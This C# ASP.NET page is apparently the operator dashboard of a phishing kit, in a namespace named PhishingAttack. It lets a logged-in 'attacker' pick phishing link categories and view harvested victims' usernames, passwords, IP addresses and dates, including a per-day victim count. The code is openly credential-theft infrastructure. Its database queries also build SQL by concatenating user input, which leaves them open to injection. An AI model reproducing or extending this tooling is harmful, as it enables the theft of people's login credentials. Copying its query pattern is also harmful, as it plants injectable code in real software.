using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Data.SqlClient;

namespace PhishingAttack
{
    public partial class Default1 : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (Session["UserName"] == null)
            {
                Response.Redirect("~/UserRegistration.aspx");
            }
            if (!IsPostBack)
            {
                GridView1.Visible = true;
                getUserDetail();
                getvictims();
            }
            
        }

        protected void lbtnMyVictims_Click(object sender, EventArgs e)
        {

        }

        protected void lbtnHome_Click(object sender, EventArgs e)
        {
            GridView2.Visible = false;
            GridView1.Visible = true;
        }

        private void getUserDetail()
        {

            if (Session["UserName"] != null)
            {
                string uname = Session["UserName"].ToString();

                string mycon = "Data Source=TOSHIBA-PC\\SQLEXPRESS;Initial Catalog=IdHackDB;Integrated Security=True";
                string query = "select UserName,Country from UserDetails where Username = '" + uname + "'";
                SqlConnection con = new SqlConnection(mycon);
                con.Open();
                SqlCommand cmd = new SqlCommand();
                cmd.CommandText = query;
                cmd.Connection = con;
                SqlDataAdapter da = new SqlDataAdapter();
                da.SelectCommand = cmd;
                DataSet ds = new DataSet();
                da.Fill(ds);
                TextBox1.Text = ds.Tables[0].Rows[0]["Username"].ToString();
                TextBox4.Text = ds.Tables[0].Rows[0]["Country"].ToString();

            }
        }

        protected void RadioButton1_CheckedChanged(object sender, EventArgs e)
        {
            string mycon = "Data Source=TOSHIBA-PC\\SQLEXPRESS;Initial Catalog=IdHackDB;Integrated Security=True";
            string query = "select LinkCategory,LinkName from AddLink";
            SqlConnection con = new SqlConnection(mycon);
            con.Open();
            SqlCommand cmd = new SqlCommand();
            cmd.CommandText = query;
            cmd.Connection = con;
            SqlDataAdapter da = new SqlDataAdapter();
            da.SelectCommand = cmd;
            DataSet ds = new DataSet();
            da.Fill(ds);
            int i = 0;
            foreach (GridViewRow row in GridView1.Rows)
            {
                string link = ds.Tables[0].Rows[i]["LinkName"].ToString();
                string dscategory = ds.Tables[0].Rows[i]["LinkCategory"].ToString();
                string gridcategory = row.Cells[1].Text;
                RadioButton rbtn1 = (row.Cells[3].FindControl("RadioButton1") as RadioButton);

                if (rbtn1.Checked)
                {
                    if (dscategory == gridcategory)
                    {
                        Response.Write("<script LANGUAGE='JavaScript' >alert('" + link + "')</script>");
                        Session["Category"] = gridcategory;
                        Session["AttackerUsername"] = TextBox1.Text;
                        string url;
                        url = gridcategory + ".aspx?AttackerUsername=" + TextBox1.Text + "&Category=" + gridcategory;
                        Response.Redirect(url);
                        
                    }

                }
                i = i + 1;

            }

            GridView1.DataBind();


        }

        protected void RadioButton2_CheckedChanged(object sender, EventArgs e)
        {
            string mycon = "Data Source=TOSHIBA-PC\\SQLEXPRESS;Initial Catalog=IdHackDB;Integrated Security=True";
            string query = "select LinkCategory,LinkName from AddLink";
            SqlConnection con = new SqlConnection(mycon);
            con.Open();
            SqlCommand cmd = new SqlCommand();
            cmd.CommandText = query;
            cmd.Connection = con;
            SqlDataAdapter da = new SqlDataAdapter();
            da.SelectCommand = cmd;
            DataSet ds = new DataSet();
            da.Fill(ds);
        }

        public void lbtnMyVictims_Click1(object sender, EventArgs e)
        {
            GridView1.Visible = false;
            GridView2.Visible = true;

            getvictims();
        }
        protected void getvictims()
        {
            if (Session["UserName"] != null)
            {
                string uname = TextBox1.Text;
                string mycon = "Data Source=TOSHIBA-PC\\SQLEXPRESS;Initial Catalog=IdHackDB;Integrated Security=True";
                string query = "select Category,VictimUserName,Password,IPAddress,Date from Victims where Username = '" + uname + "'";
                SqlConnection con = new SqlConnection(mycon);
                con.Open();
                SqlCommand cmd = new SqlCommand();
                cmd.CommandText = query;
                cmd.Connection = con;
                SqlDataAdapter da = new SqlDataAdapter();
                da.SelectCommand = cmd;
                DataSet ds = new DataSet();
                da.Fill(ds);

                GridView2.DataSource = ds;
                GridView2.DataBind();
                string totalvictims = ds.Tables[0].Rows.Count.ToString();
                TextBox2.Text = totalvictims;

            }
        }

        protected void LinkButton1_Click(object sender, EventArgs e)
        {
            string todaydate = DateTime.Now.ToShortDateString();

            if (Session["UserName"] != null)
            {
                string uname = TextBox1.Text;
                string mycon = "Data Source=TOSHIBA-PC\\SQLEXPRESS;Initial Catalog=IdHackDB;Integrated Security=True";
                string query = "select Category,VictimUserName,Password,IPAddress,Date from Victims where Username = '" + uname + "' AND Date='" + todaydate + "'";
                SqlConnection con = new SqlConnection(mycon);
                con.Open();
                SqlCommand cmd = new SqlCommand();
                cmd.CommandText = query;
                cmd.Connection = con;
                SqlDataAdapter da = new SqlDataAdapter();
                da.SelectCommand = cmd;
                DataSet ds = new DataSet();
                da.Fill(ds);
                con.Close();
                GridView2.DataSource = ds;
                GridView2.DataBind();

                if (ds.Tables[0].Rows.Count > 0)
                {
                    GridView1.Visible = false;
                    GridView2.Visible = true;
                }
                else
                {
                   Response.Write("<script LANGUAGE='JavaScript' >alert('There is no victims today!!')</script>");
                }
            }
        }

        protected void logoutbtn_Click(object sender, EventArgs e)
        {
            if (Session["UserName"] != null)
            {
                string tex1 = Session["UserName"].ToString();
            }
            Session.Clear();
            if (Session["UserName"] != null)
            {
                string tex2 = Session["UserName"].ToString();
            }
                updatecounter();
                Response.Redirect("~/UserRegistration.aspx");
        }
        private void updatecounter()
        {
            string mycon = "Data Source=TOSHIBA-PC\\SQLEXPRESS;Initial Catalog=IdHackDB;Integrated Security=True";
            string query = "Update ViewCounter set Counters = Counters+1";
            SqlConnection con =new SqlConnection(mycon);
            con.Open();
            SqlCommand cmd = new SqlCommand();
            cmd.Connection = con;
            cmd.CommandText = query;
            cmd.ExecuteNonQuery();                
        }
    }
}